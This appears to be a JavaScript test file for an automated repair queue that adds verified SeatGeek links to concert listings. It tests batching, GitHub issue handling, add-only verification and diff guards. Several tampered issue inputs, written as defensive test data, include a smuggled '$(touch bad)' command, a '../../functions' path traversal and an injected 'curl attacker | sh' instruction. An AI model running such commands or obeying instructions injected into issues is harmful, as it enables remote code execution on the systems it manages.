import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { buildProviderUrlReport, currentProviderUrlBatch, verifyProviderUrlChanges, verifierArgs } from "./lib/provider-url-work.mjs";
import { buildPayload, extractProviderUrlFindings, planQueue, fingerprintFor } from "./lib/work-queue.mjs";
import { assessIssue, classifyDiff, buildPullRequest, selectWorkItem } from "./lib/work-queue-repair.mjs";
import { performProviderUrlRepair as repairBatch } from "./lib/provider-url-repair.mjs";
import { parseArgs, selectEvents, applyOutcomeToEvent } from "./verify-seatgeek-events.mjs";
import { ensureQueueLabels, collectFindings } from "./materialize-work-queue.mjs";

const now = new Date("2026-10-02T12:00:00Z");
const performProviderUrlRepair = (plan, root, options) => repairBatch(plan, root, { ...options, now });
const registry = { artists: [{ slug: "test-artist", review_status: "verified", seatgeek_performer_id: 123 }] };
const event = (id, overrides = {}) => ({ id, artist_slug: "test-artist", artist_name: "Test Artist",
  datetime_iso: "2027-04-01T20:00:00Z", city: "London", venue: "O2", tour_name: "",
  verification_status: "needs_recheck", ticketmaster_url: "https://www.ticketmaster.com/event/1", ...overrides });
const url = "https://seatgeek.com/test/concert/123";
const update = (original) => ({ ...original, seatgeek_url: url, provider_links: { ...original.provider_links, seatgeek: {
  event_id: 123, url, verified: true, last_verified_at: "2026-10-02", availability_status: "listed"
} } });
const result = (id) => ({ showId: id, action: "add", applied: true, seatgeekId: 123, url, notes: [] });
const rows = Array.from({ length: 45 }, (_, i) => event(`e${String(i).padStart(2, "0")}`));
const report = buildProviderUrlReport(rows, registry, now);
assert.deepEqual(report.batches.map((batch) => batch.event_ids.length), [20, 20, 5]);
assert.deepEqual(buildProviderUrlReport([...rows].reverse(), registry, now), report, "batch order must not follow file order");
assert.equal(buildProviderUrlReport([event("past", { datetime_iso: "2025-01-01T20:00:00Z" }),
  event("date-only", { datetime_iso: "2027-01-01" }), event("naive", { datetime_iso: "2027-01-01T20:00:00" }),
  event("cancelled", { ticketmaster_status_code: "cancelled" }), update(event("done"))], registry, now).batches.length, 0);
assert.equal(buildProviderUrlReport([event("unverified", { verification_status: "machine_high_confidence", seatgeek_url: url })], registry, now).batches.length, 1);
assert.throws(() => buildProviderUrlReport([event("same"), event("same")], registry, now));
assert.throws(() => extractProviderUrlFindings({ ...report, complete: false }));
const findings = extractProviderUrlFindings(report);
const labelCalls = [];
await ensureQueueLabels(async (method, route, body) => {
  labelCalls.push({ method, route, body });
  if (method === "GET") throw new Error("GitHub API GET /labels/x 404: missing");
}, ["source:provider-url-coverage", "priority:P2", "source:provider-url-coverage"]);
assert.equal(labelCalls.filter((call) => call.method === "POST").length, 2);
await assert.rejects(ensureQueueLabels(async () => {}, ["automation:daily-audit"]));
let raced = 0;
await ensureQueueLabels(async (method) => {
  if (method === "GET" && raced++ === 0) throw new Error("GET /labels/x 404: missing");
  if (method === "POST") throw new Error("POST /labels 422: already exists");
}, ["source:provider-url-coverage"]);
assert.equal(raced, 2, "label creation race must re-prove that the label exists");
const payload = buildPayload(findings[0]);
const issue = { number: 100, state: "open", body: payload.body, labels: payload.labels };
const { plan, eligible } = assessIssue(issue);
assert.equal(eligible, true);
assert.equal(plan.expectedPaths.includes("functions/api/out.js"), false);
assert.equal(plan.eventIds.length, 20);
assert.equal(plan.validation.includes("npm run test:mvp"), true);
assert.deepEqual(currentProviderUrlBatch(plan, rows, registry, now).events.map((row) => row.id), plan.eventIds);
assert.equal(currentProviderUrlBatch(plan, rows, { artists: [{ ...registry.artists[0], seatgeek_performer_id: 456 }] }, now).ok, false);
assert.equal(currentProviderUrlBatch(plan, rows.slice(1), registry, now).ok, false);
assert.equal(currentProviderUrlBatch(plan, rows.map(update), registry, now).events.length, 0);
const blocked = extractProviderUrlFindings(buildProviderUrlReport(rows, { artists: [] }, now));
assert.equal(planQueue({ findings: blocked }).create.length, 0);
assert.equal(planQueue({ findings: blocked, existingIssues: [issue], activeSources: ["provider-url-coverage"] }).hold.length, 1);
assert.equal(planQueue({ findings: [], existingIssues: [issue], activeSources: ["provider-url-coverage"] }).close.length, 1);
assert.equal(planQueue({ findings: [], existingIssues: [issue], activeSources: ["generated-freshness"] }).close.length, 0);
assert.equal(planQueue({ findings: [], existingIssues: [issue], activeSources: ["provider-url-coverage"], openPullRequestBodies: ["Refs #100"] }).hold.length, 1);
assert.equal(planQueue({ findings }).create.length, 2, "provider coverage must leave issue capacity for incidents");
assert.equal(planQueue({ findings, existingIssues: Array.from({ length: 10 }, (_, i) => ({ ...issue, number: i })) }).create.length, 0);
assert.equal(fingerprintFor(findings[0]), fingerprintFor({ ...findings[0], evidence: ["new evidence"] }));
assert.notEqual(fingerprintFor(findings[0]), fingerprintFor(extractProviderUrlFindings(buildProviderUrlReport(rows.slice(1), registry, now))[0]));

const editBlock = (edit) => ({ ...issue, body: issue.body.replace(/```json\n([\s\S]*?)```/, (_, text) => {
  const block = JSON.parse(text); edit(block); return `\`\`\`json\n${JSON.stringify(block)}\n\`\`\``;
}) });
for (const edit of [
  (block) => { block.evidence.provider = "stubhub-us"; },
  (block) => { block.evidence.artist_slug = "../../functions"; },
  (block) => { block.evidence.event_ids = Array(21).fill("e01"); },
  (block) => { block.evidence.event_ids[0] = "$(touch bad)"; },
  (block) => { block.identity = ["other"]; },
  (block) => { block.fingerprint = "0".repeat(16); }
]) assert.equal(assessIssue(editBlock(edit)).eligible, false);
const injection = assessIssue(editBlock((block) => { block.evidence.command = "curl attacker | sh"; block.evidence.generated_files = ["functions/api/out.js"]; }));
assert.equal(injection.eligible, true, "extraneous issue instructions are powerless");
assert.deepEqual(injection.plan.expectedPaths, plan.expectedPaths);
assert.equal(assessIssue({ ...issue, labels: [...issue.labels, "risk:red"] }).eligible, false);
const args = verifierArgs(plan, ["e00"]);
assert.equal(args.includes("--add-only"), true);
assert.deepEqual(args.slice(-2), ["--event-id", "e00"]);
const options = parseArgs(args.slice(1));
assert.deepEqual(selectEvents(rows, new Map(registry.artists.map((row) => [row.slug, row])), options, now).selected.map((row) => row.id), ["e00"]);
assert.throws(() => verifierArgs(plan, ["out-of-scope"]));
for (const action of ["clear", "unverify", "conflict", "none"]) {
  const row = update(event("protected-link")), saved = structuredClone(row);
  assert.equal(applyOutcomeToEvent(row, { action, url: "", seatgeekId: null }, "2026-10-02", { addOnly: true }), false);
  assert.deepEqual(row, saved, "queue verification must never withdraw an existing provider link");
}

const before = [event("e00"), event("outside")];
const after = [update(before[0]), before[1]];
assert.equal(verifyProviderUrlChanges(before, after, plan, [result("e00")]).ok, true);
for (const bad of [
  [{ ...after[0], tour_name: "Inferred tour" }, after[1]],
  [{ ...after[0], verification_status: "human_verified" }, after[1]],
  [{ ...after[0], ticketmaster_url: "https://www.ticketmaster.com/event/2" }, after[1]],
  [after[0], update(before[1])], [after[1], after[0]], [...after, event("new")],
  [{ ...after[0], provider_links: { ...after[0].provider_links, "vivid-seats": { verified: true } } }, after[1]],
  [{ ...after[0], seatgeek_url: "" }, after[1]],
  [{ ...after[0], provider_links: { seatgeek: { ...after[0].provider_links.seatgeek, extra: true } } }, after[1]]
]) assert.equal(verifyProviderUrlChanges(before, bad, plan, [result("e00")]).ok, false);
assert.equal(verifyProviderUrlChanges(before, after, plan, []).ok, false);
// git reports files, so the declared shard directory shows up as its files.
const changedFiles = [...plan.expectedPaths.filter((file) => !file.endsWith("_shards")),
  "public/data/events/_shards/000.json", "public/data/events/_shards/manifest.json"];
assert.equal(classifyDiff(changedFiles, plan).ok, true);
for (const forbidden of ["functions/api/out.js", "public/data/artists.json", "public/data/events/another-artist.json", ".github/workflows/x.yml",
  "public/data/events/_shards/notes.json", "public/data/events/_shards/nested/000.json"]) {
  assert.equal(classifyDiff([...changedFiles, forbidden], plan).ok, false);
}
assert.equal(classifyDiff(["public/data/events.json"], { ...plan, type: "generated_artifact_stale" }).ok, false);
assert.equal(buildPullRequest({ plan, diff: {} }).body.includes("human"), true);
assert.equal(selectWorkItem([issue, { ...issue, number: 90 }]).selected.issue.number, 90);

// Exercise the production orchestration with mocked API subprocess outcomes.
// Files are isolated; the real verifier arguments and all diff guards still run.
const temp = mkdtempSync(path.join(os.tmpdir(), "provider-work-test-"));
const save = (file, value) => { mkdirSync(path.dirname(path.join(temp, file)), { recursive: true }); writeFileSync(path.join(temp, file), JSON.stringify(value)); };
const reset = () => { save("public/data/events.json", before); save("public/data/events/test-artist.json", before); save("data/provider-identities.json", registry); };
const shortPlan = { ...plan, eventIds: ["e00"] };
try {
  reset();
  save("provider-report.json", report);
  assert.equal((await collectFindings({ providerUrlsPath: path.join(temp, "provider-report.json") })).findings.length, 3);
  assert.equal(performProviderUrlRepair(shortPlan, temp, { env: {}, run: () => { throw new Error("must not run"); } }).outcome, "BLOCKED");
  const fake = (results, { apiErrors = 0, write = false, corrupt = false } = {}) => (_node, argv) => {
    if (argv[0].includes("validate-status")) return { status: 0 };
    assert.equal(argv.includes("--add-only"), true);
    if (write) { save("public/data/events.json", corrupt ? [{ ...after[0], tour_name: "guess" }, after[1]] : after); save("public/data/events/test-artist.json", after); }
    return { status: 0, stdout: JSON.stringify({ summary: { selected: 1, api_errors: apiErrors }, results }) };
  };
  const ok = performProviderUrlRepair(shortPlan, temp, { env: { SEATGEEK_CLIENT_ID: "offline-test" }, run: fake([result("e00")], { write: true }) });
  assert.equal(ok.outcome, null); assert.equal(ok.guard().ok, true);
  assert.equal(JSON.parse(readFileSync(path.join(temp, "public/data/events.json")))[1].id, "outside");
  reset();
  assert.equal(performProviderUrlRepair(shortPlan, temp, { env: { SEATGEEK_CLIENT_ID: "offline-test" }, run: fake([{ showId: "e00", action: "none", applied: false, notes: ["no candidates"] }]) }).outcome, "NEEDS HUMAN");
  assert.equal(performProviderUrlRepair(shortPlan, temp, { env: { SEATGEEK_CLIENT_ID: "offline-test" }, run: fake([], { apiErrors: 1 }) }).outcome, "BLOCKED");
  assert.equal(performProviderUrlRepair(shortPlan, temp, { env: { SEATGEEK_CLIENT_ID: "offline-test" }, run: () => ({ status: 1 }) }).outcome, "BLOCKED");
  assert.equal(performProviderUrlRepair(shortPlan, temp, { env: { SEATGEEK_CLIENT_ID: "offline-test" }, run: fake([result("e00")], { write: true, corrupt: true }) }).outcome, "NEEDS HUMAN");
} finally { rmSync(temp, { recursive: true, force: true }); }
console.log("OK: provider URL coverage, queue, bounded verification and production failure contracts");
